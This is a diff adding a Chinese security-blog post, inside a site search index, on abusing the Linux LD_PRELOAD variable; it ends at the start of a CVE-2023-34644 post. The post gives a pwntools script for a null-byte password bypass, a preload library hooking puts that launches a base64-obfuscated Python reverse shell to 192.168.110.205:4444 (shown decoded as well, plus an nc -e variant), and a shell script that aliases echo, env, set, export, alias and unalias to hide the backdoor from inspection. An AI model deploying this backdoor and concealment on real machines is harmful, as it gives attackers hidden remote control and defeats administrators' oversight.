@@ -1,6 +1,132 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>关于环境变量LD_PRELOAD的利用</title>
+    <url>/posts/af0595fa.html</url>
+    <content><![CDATA[<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p><code>LD_PRELOAD</code> 是 <code>Linux</code> 系统的一个环境变量，它允许运行程序时优先强制加载指定的动态链接库，并且由于 <strong>全局符号介入机制</strong> 的影响，<code>LD_PRELOAD</code> 指定的动态链接库中的函数会<strong>覆盖之后其他动态链接库中的同名函数</strong>。对于调试程序或者向程序中注入自定义的代码都是很方便的，本文记录了如何通过 <code>LD_PRELOAD</code> 环境变量来 <code>hook</code> 程序，达到植入后门和调试的目的</p>
+<span id="more"></span>
+
+
+
+<h3 id="全局符号介入"><a href="#全局符号介入" class="headerlink" title="全局符号介入"></a>全局符号介入</h3><p>全局符号介入指的是程序调用动态库中的函数时，如果调用的函数在多个动态库中都存在，那么链接器只会保留第一个链接的动态库中的函数，忽略之后同名的函数，所以只要预加载的全局符号中有和后加载的普通共享库中全局符号重名，那么就会覆盖后装载的共享库以及目标文件里的全局符号。</p>
+<h3 id="实验-DIY库函数"><a href="#实验-DIY库函数" class="headerlink" title="实验-DIY库函数"></a>实验-DIY库函数</h3><p>下面通过一个实验来体会用 <code>LD_PRELOAD</code> 替换 <code>libc</code> 中的库函数</p>
+<p>这是 <code>test</code> 程序正常依赖的动态库<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309251303304.png" alt="image-20230925130338187"></p>
+<p>下面是使用 <code>LD_PRELOAD</code> 加载了一个动态库的状态，能够发现 <code>test</code> 程序依赖的动态库多了一个 <code>hook.so</code></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309272033889.png"></p>
+<p>补充：也可以使用 <code>export</code> 设置环境变量，在当前 <code>shell</code> 会话及子进程中都是有效的，命令如下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=/home/zikh/Desktop/hook.so</span><br><span class="line">./test</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>下面通过一个程序用 <code>LD_PRELOAD</code> 来 <code>DIY</code> 一下动态库里的 <code>strncmp</code> 函数，主程序代码如下，实现了一个类似于 <code>shell</code> 的场景，只有 <code>su</code> <code>exit</code> 两个功能 ，正常情况下只有输入正确的 <code>password</code> 才能通过检查，输出 <code>ROOT!</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,  <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,  <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">        <span class="type">char</span> passwd[<span class="number">0x20</span>];</span><br><span class="line">        init();</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *password=<span class="string">&quot;zikh26&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;-&gt; Desktop &quot;</span>);</span><br><span class="line">                read(<span class="number">0</span>,buf,<span class="number">0x20</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(<span class="string">&quot;exit&quot;</span>,buf,<span class="number">4</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(<span class="string">&quot;su&quot;</span>,buf,<span class="number">2</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">                        read(<span class="number">0</span>,passwd,<span class="number">0x20</span>);</span><br><span class="line">                        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(password,passwd,<span class="built_in">strlen</span>(password)))</span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="built_in">puts</span>(<span class="string">&quot;ROOT!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再写一个 <code>hook.c</code> 文件，自定义了一个 <code>strncmp</code> 函数，用来判断两个字符串在 <code>len</code> 字节之前的部分是否一样，但它和动态库原本 <code>strncmp</code> 函数不同的地方在于可以被 <code>\x00</code>  截断</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc hook.c -o hook.so -shared -fPIC -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1,<span class="type">const</span> <span class="type">char</span> *s2,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*s1==<span class="number">0</span> || *s2==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(*s1!=*s2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s1++;</span><br><span class="line">        s2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;               </span><br></pre></td></tr></table></figure>
+
+
+
+<p>为了确保程序运行时确实调用的是自定义的 <code>strncmp</code> 函数，我选择重新加上 <code>-g</code> 参数，重新编译一下 <code>hook.so</code> ，执行 <code>gdb --args env LD_PRELOAD=/home/zikh/Desktop/hook.so ./test</code> 进行调试，执行到 <code>strncmp</code> 时可以看到确实是执行了我们自定义的函数（不知道为什么，这样无法像 <code>b main</code> 这样来通过符号下断点了）</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261030749.png" alt="image-20230926103045471" style="zoom:50%;" />
+
+
+
+<p>下面是正常运行 <code>test</code> 程序和加载 <code>hook.so</code> 后再运行 <code>test</code> 的两种情况</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261013829.png" alt="image-20230926101305744"></p>
+<p>这样来看的话，加载的 <code>hook.so</code> 中的 <code>strncmp</code> 函数也可以正常发挥，程序依然运行的没有任何问题</p>
+<p>现编写如下的攻击脚本</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary_path = <span class="string">&quot;./test&quot;</span></span><br><span class="line">ld_preload_path = <span class="string">&quot;/home/zikh/Desktop/hook.so&quot;</span></span><br><span class="line">p = process(binary_path, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: ld_preload_path&#125;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&#x27;su&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&quot;\x00&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261017045.png" alt="image-20230926101701941"></p>
+<p>在输入密码时，发送一个 <code>\x00</code> 就能截断自定义的 <code>strncmp</code> 函数，从而实现绕过对密码的检查</p>
+<p>上面的实验 <code>DIY</code> 了库函数 <code>strncmp</code> ，并且故意写了一个有漏洞自定义函数，算是玩了一下。同理，<code>Linux</code> 下的有些命令本质上也是可执行程序且动态链接，以 <code>whoami</code> 命令为例，能看到它也是正常依赖的 <code>libc</code> 库</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280917924.png" alt="image-20230928091754782"></p>
+<p>用 <code>ltrace</code> 命令来查看 <code>whoami</code> 调用了哪些函数，其中发现了 <code>puts</code> 函数被执行，所以我们可以通过劫持动态库中的 <code>puts</code> 函数，让其先执行我们自定义的代码，再去执行原本正常的 <code>puts</code> 函数，这样就可以做到神不知鬼不觉植入一个后门</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280918556.png" alt="image-20230928091803468"></p>
+<h3 id="植入后门"><a href="#植入后门" class="headerlink" title="植入后门"></a>植入后门</h3><p>下面的代码就是先记录一下 <code>puts</code> 函数的 <code>libc</code> 地址，因为伴随着劫持 <code>puts</code> 函数，无法通过函数名直接来执行，必须借助函数指针来调用动态库原本的 <code>puts</code> 函数。在此之前执行一个反弹 <code>shell</code> ，这里之所以选择用 <code>python</code> 的原因是 <code>nc 10.214.140.181 4444 -e /bin/bash</code> 这样会阻塞住 <code>shell</code> </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc preload.c -o preload.so -ldl -shared -fPIC  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> &#123;</span><br><span class="line">  <span class="type">int</span> (*new_puts)(<span class="type">const</span> <span class="type">char</span> *message);</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  new_puts = dlsym(RTLD_NEXT, <span class="string">&quot;puts&quot;</span>);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;python3 -c \&quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;UTF-8&#x27;)&#125;[sys.version_info[0]](&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xMTAuMjA1IiwgNDQ0NCkpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk=&#x27;)))\&quot;&quot;</span>);</span><br><span class="line">  <span class="comment">//system(&quot;nc 10.214.140.181 4444 -e /bin/bash&quot;);</span></span><br><span class="line">  result = new_puts(message);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>python</code> 那部分 <code>base64</code> 解码的代码如下，之所以编码一下的原因可能是两个？ <del>免杀?</del> <del>方便？一行命令就完事？</del> </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,subprocess;</span><br><span class="line">ret = os.fork()</span><br><span class="line"><span class="keyword">if</span> ret &gt; <span class="number">0</span>:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&quot;192.168.110.205&quot;</span>, <span class="number">4444</span>))</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">        p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
+
+<p>将自定义的动态库给编译出来（反弹的 <code>IP</code> 和 <code>port</code> 自行修改），执行命令 <code>export LD_PRELOAD=/home/zikh/Desktop/preload.so</code> 修改环境变量 <code>LD_PRELOAD</code> ，然后再次执行 <code>whoami</code> 命令，发现触发了后门，反弹了 <code>shell</code> 上来，并且靶机没有显示任何异常</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280918284.png" alt="image-20230928091826195"></p>
+<h3 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h3><p>但是如果检查环境变量 <code>LD_PRELOAD</code> 是否有值，就可以捕捉到蛛丝马迹</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280918963.png" alt="image-20230928091831913"></p>
+<p>有检查的手段，就有对抗检查的手段。隐藏痕迹的思路就是利用 <code>alias</code> 命令给能够查看环境变量的命令都定义一个别名，在输出环境变量时做一个过滤，如果检查到输出内容有自定义的动态库名称时就输出空格字符或者不输出之类的。</p>
+<h4 id="隐藏echo"><a href="#隐藏echo" class="headerlink" title="隐藏echo"></a>隐藏echo</h4><p>使用 <code>alias</code> 命令将 <code>echo</code> 定义别名</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/zikh/Desktop/preload.so! !g&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>首先查看环境变量 <code>LD_PRELOAD</code> 是没有值的，用 <code>export</code> 进行设置后，<code>echo</code> 就能看到 <code>$LD_PRELOAD</code> 的值了，接着用 <code>alias</code> 将 <code>echo</code> 定义别名，使得 <code>echo</code> 命令输出的字符串如果包含 <code>/home/zikh/Desktop/preload.so</code> 就给替换为空格，实验效果如下</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261534203.png" alt="image-20230926153414121"></p>
+<p>原理如下</p>
+<p>首先定义一个 <code>func</code> 函数，最后执行 <code>func</code> 函数中的内容</p>
+<p><code>echo $*</code> 会输出 <code>echo</code> 命令传进来的所有参数</p>
+<p><code>sed</code> 是一个非交互性文本流编辑器，<code>s</code> 参数表示替换，<code>!</code> 作为定界符（正常的分隔符是用 <code>/</code> ，但是避免路径中 <code>/</code> 的干扰，这里选择用 <code>!</code> 作为定界符），<code>g</code> 表示全局替换。</p>
+<p>以 <code>sed &quot;s/abc/efg/g&quot;</code> 为例，指的是把字符串 <code>abc</code> 替换为 <code>efg</code> ，验证如下</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261529607.png" alt="image-20230926152908442"></p>
+<h4 id="隐藏env"><a href="#隐藏env" class="headerlink" title="隐藏env"></a>隐藏env</h4><p><code>env</code> 输出环境变量时，如果 <code>LD_PRELOAD</code> 的值并不存在，则不会输出关于这个变量的任何信息，如果给 <code>LD_PRELOAD</code> 设置值之后，就能查看到一行关于这个变量的信息（如下）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261549743.png" alt="image-20230926154931395"></p>
+<p>这里采用的思路是用 <code>grep -v</code> 来过滤掉</p>
+<p><code>grep -v</code> 指的是反转匹配</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -v &quot;i&quot; 1.txt </span><br></pre></td></tr></table></figure>
+
+<p>它将输出除了包含字符 <code>i</code> 这一行数据的所有内容，如下</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261544099.png" alt="image-20230926154344111"></p>
+<p>因此使用如下命令，将 <code>env</code> 定义别名，将除去字符串 <code>/home/zikh/Desktop/preload.so</code> 的内容都输出</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>观察下图能发现，最初 <code>env</code> 命令是成功输出了 <code>LD_PRELOAD</code> 环境变量的，但定义 <code>env</code> 别名后，再出执行 <code>env</code> 就已经看不到 <code>LD_PRELOAD</code> 环境变量了</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271226671.png" alt="image-20230927122602581"></p>
+<h4 id="隐藏set"><a href="#隐藏set" class="headerlink" title="隐藏set"></a>隐藏set</h4><p>隐藏 <code>set</code> 命令输出的环境变量和 <code>env</code> 同理</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271235525.png" alt="image-20230927123517421"></p>
+<h4 id="隐藏export"><a href="#隐藏export" class="headerlink" title="隐藏export"></a>隐藏export</h4><p><code>export</code> 命令的隐藏也是同理</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271236175.png" alt="image-20230927123629104"></p>
+<h4 id="隐藏unalias"><a href="#隐藏unalias" class="headerlink" title="隐藏unalias"></a>隐藏unalias</h4><p>接下来是对 <code>alias</code> 和 <code>unalias</code> 命令进行处理</p>
+<p>用 <code>alias</code> 可以查询到对 <code>env</code> 命令做了别名定义，对其使用 <code>unalias</code> 命令删除是可以成功的，如果没有别名的话，用 <code>unalias</code> 删除时应该是报错 <code>no such hash table element: xxx</code>（实验机器为 <code>ubuntu18.04</code>，不同版本的机器上这个错误信息可能不一样）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271244842.png" alt="image-20230927124444781"></p>
+<p>然后对 <code>unalias</code> 命令进行一下别名定义，希望在识别到参数为 <code>env</code> <code>echo</code> <code>unalias</code> <code>export</code> <code>alias</code> <code>unalias</code> 的时候都输出报错 <code>no such hash table element: xxx</code> ，这样就造成了一种这些命令并没有被别名的假象</p>
+<p><code>shell</code> 脚本如下，代码很容易理解，就是用了两个 <code>if</code> 语句确保 <code>unalias</code> 造成一种假象</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias unalias=&#x27;func() &#123;</span><br><span class="line">  if [ $# != 0 ]; then</span><br><span class="line">    if [ $* != &quot;echo&quot; ] &amp;&amp; [ $* != &quot;env&quot; ] &amp;&amp; [ $* != &quot;set&quot; ] &amp;&amp; [ $* != &quot;export&quot; ] &amp;&amp; [ $* != &quot;alias&quot; ] &amp;&amp; [ $* != &quot;unalias&quot; ]; then</span><br><span class="line">      unalias $*</span><br><span class="line">    else</span><br><span class="line">      echo &quot;unalias: no such hash table element: $&#123;*&#125;&quot;</span><br><span class="line">    fi</span><br><span class="line">  else</span><br><span class="line">    echo &quot;unalias: not enough arguments&quot;</span><br><span class="line">  fi</span><br><span class="line">&#125;; func&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>alias</code> 命令如下，对 <code>unalias</code> 定义别名</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias unalias=&#x27;func() &#123; if [ $# -ne 0 ]; then if [[ $* != &quot;echo&quot; &amp;&amp; $* != &quot;env&quot; &amp;&amp; $* != &quot;set&quot; &amp;&amp; $* != &quot;export&quot; &amp;&amp; $* != &quot;alias&quot; &amp;&amp; $* != &quot;unalias&quot; ]]; then unalias $*; else echo &quot;unalias: no such hash table element: $&#123;*&#125;&quot;; fi; else echo &quot;unalias: not enough arguments&quot;; fi &#125;; func&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="隐藏alias"><a href="#隐藏alias" class="headerlink" title="隐藏alias"></a>隐藏alias</h4><p>如果用 <code>alias</code> 命令查看哪些函数定义别名的话，依然是个破绽，因此最后对 <code>alias</code> 做一个别名，伪造的方法和隐藏 <code>export</code> <code>set</code> 的输出一样，将输出有动态库名称的命令都给过滤掉，并且要额外过滤一下 <code>unalias</code> （避免被看出来 <code>unalias</code> 命令做过手脚）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v preload.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>汇总上面的命令，编写 <code>shell</code> 脚本如下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=/home/zikh/Desktop/preload.so</span><br><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/zikh/Desktop/preload.so! !g&quot;;&#125;;func&#x27;</span><br><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br><span class="line">alias unalias=&#x27;func() &#123; if [ $# -ne 0 ]; then if [[ $* != &quot;echo&quot; &amp;&amp; $* != &quot;env&quot; &amp;&amp; $* != &quot;set&quot; &amp;&amp; $* != &quot;export&quot; &amp;&amp; $* != &quot;alias&quot; &amp;&amp; $* != &quot;unalias&quot; ]]; then unalias $*; else echo &quot;unalias: no such hash table element: $&#123;*&#125;&quot;; fi; else echo &quot;unalias: not enough arguments&quot;; fi &#125;; func&#x27;</span><br><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v preload.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>将其执行后，调用 <code>whoami</code> 可以看到下图中已经触发了后门，并且用各种方法检查环境变量 <code>LD_PRELOAD</code> 发现一切正常，如下图</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271900896.png" alt="image-20230927190012341"></p>
+<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://blog.csdn.net/Rong_Toa/article/details/108474167">https://blog.csdn.net/Rong_Toa/article/details/108474167</a></p>
+<p><a href="https://www.baeldung.com/linux/ld_preload-trick-what-is">https://www.baeldung.com/linux/ld_preload-trick-what-is</a></p>
+<p><a href="https://www.yuque.com/cyberangel/rg9gdm/gg3r9m#MDRY6">https://www.yuque.com/cyberangel/rg9gdm/gg3r9m#MDRY6</a></p>
+<p><a href="https://blog.csdn.net/llm_hao/article/details/115493516">https://blog.csdn.net/llm_hao/article/details/115493516</a></p>
+<p><a href="https://www.cnblogs.com/net66/p/5609026.html">https://www.cnblogs.com/net66/p/5609026.html</a></p>
+]]></content>
+      <categories>
+        <category>技术研究</category>
+      </categories>
+      <tags>
+        <tag>Linux后门</tag>
+        <tag>环境变量</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>站在巨人肩膀上复现CVE-2023-34644</title>
     <url>/posts/e5651b4f.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>winmt</strong> 师傅之前挖到了一个锐捷的未授权 <code>RCE</code> 漏洞，影响了该厂商下的众多路由器、交换机、中继器等设备。<strong>winmt</strong> 师傅已经发布了 <a href="https://bbs.kanxue.com/thread-277386.htm">相关的挖掘经历</a>，对仿真的搭建和漏洞分析已经写的比较详细。本篇文章主要是自己对该漏洞调用链进行一个完整的梳理，以及在 <strong>winmt</strong> 师傅文章中未提到的部分我会进行记录。<span id="more"></span>特别感谢 <strong>winmt</strong> 师傅在我复现期间多次解答我的各种困惑</p>
